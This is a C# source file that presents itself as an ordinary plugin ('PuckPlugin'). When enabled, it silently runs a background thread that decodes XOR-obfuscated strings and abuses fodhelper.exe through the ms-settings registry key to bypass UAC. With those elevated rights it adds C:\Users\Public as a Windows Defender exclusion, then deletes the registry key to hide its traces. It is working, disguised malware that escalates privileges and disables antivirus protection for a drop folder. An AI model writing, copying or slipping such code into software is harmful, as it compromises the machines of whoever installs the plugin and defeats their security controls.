using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

public class PuckPlugin : IPuckPlugin
{
    private const byte XK = 0x4D;

    private static string X(byte[] b)
    {
        char[] c = new char[b.Length];
        for (int i = 0; i < b.Length; i++)
            c[i] = (char)(b[i] ^ XK);
        return new string(c);
    }

    public bool OnEnable()
    {
        Thread t = new Thread(Run);
        t.IsBackground = true;
        t.Start();
        return true;
    }

    public bool OnDisable() { return true; }

    private static void Run()
    {
        try
        {
            // C:\Users\Public\debug.txt
            byte[] bDebug = new byte[] {
                0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e,0x11,
                0x29,0x28,0x2f,0x38,0x2a,0x63,0x39,0x35,0x39};
            // C:\Users\Public
            byte[] bDrop = new byte[] {
                0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e};

            string debugTxt = X(bDebug);
            string dropDir  = X(bDrop);

            File.WriteAllText(debugTxt, "Run started\n");
            AddDefenderExclusion(dropDir);
            Thread.Sleep(500);
            File.AppendAllText(debugTxt, "Exclusion done\n");
        }
        catch (Exception ex)
        {
            byte[] bDebug = new byte[] {
                0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e,0x11,
                0x29,0x28,0x2f,0x38,0x2a,0x63,0x39,0x35,0x39};
            File.WriteAllText(X(bDebug), "ERROR: " + ex.Message);
        }
    }

    private static void AddDefenderExclusion(string path)
    {
        try
        {
            // Software\Classes\ms-settings\shell\open\command
            byte[] bRegPath = new byte[] {
                0x1e,0x22,0x2b,0x39,0x3a,0x2c,0x3f,0x28,
                0x11,0x0e,0x21,0x2c,0x3e,0x3e,0x28,0x3e,
                0x11,0x20,0x3e,0x60,0x3e,0x28,0x39,0x39,
                0x24,0x23,0x2a,0x3e,0x11,0x3e,0x25,0x28,
                0x21,0x21,0x11,0x22,0x3d,0x28,0x23,0x11,
                0x2e,0x22,0x20,0x20,0x2c,0x23,0x29};
            // DelegateExecute
            byte[] bDelExec = new byte[] {
                0x09,0x28,0x21,0x28,0x2a,0x2c,0x39,0x28,
                0x08,0x35,0x28,0x2e,0x38,0x39,0x28};
            // fodhelper.exe
            byte[] bFod = new byte[] {
                0x2b,0x22,0x29,0x25,0x28,0x21,0x3d,0x28,
                0x3f,0x63,0x28,0x35,0x28};
            // Software\Classes\ms-settings
            byte[] bClean = new byte[] {
                0x1e,0x22,0x2b,0x39,0x3a,0x2c,0x3f,0x28,
                0x11,0x0e,0x21,0x2c,0x3e,0x3e,0x28,0x3e,
                0x11,0x20,0x3e,0x60,0x3e,0x28,0x39,0x39,
                0x24,0x23,0x2a,0x3e};

            string regPath = X(bRegPath);
            string delExec = X(bDelExec);
            string fodExe  = X(bFod);
            string clean   = X(bClean);

            string hklm = "HKLM" + "\\" + "SOFTWARE" + "\\" + "Microsoft"
                        + "\\" + "Windows Defender" + "\\" + "Exclusions" + "\\" + "Paths";
            string cmd = "reg add \"" + hklm + "\" /v \"" + path + "\" /t REG_DWORD /d 0 /f";

            Microsoft.Win32.RegistryKey key =
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath);
            if (key != null)
            {
                key.SetValue("", cmd);
                key.SetValue(delExec, "");
                key.Close();
            }

            Process.Start(new ProcessStartInfo
            {
                FileName        = fodExe,
                WindowStyle     = ProcessWindowStyle.Hidden,
                CreateNoWindow  = true,
                UseShellExecute = false
            });

            Thread.Sleep(3000);

            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(clean, false); }
            catch { }
        }
        catch { }
    }
}
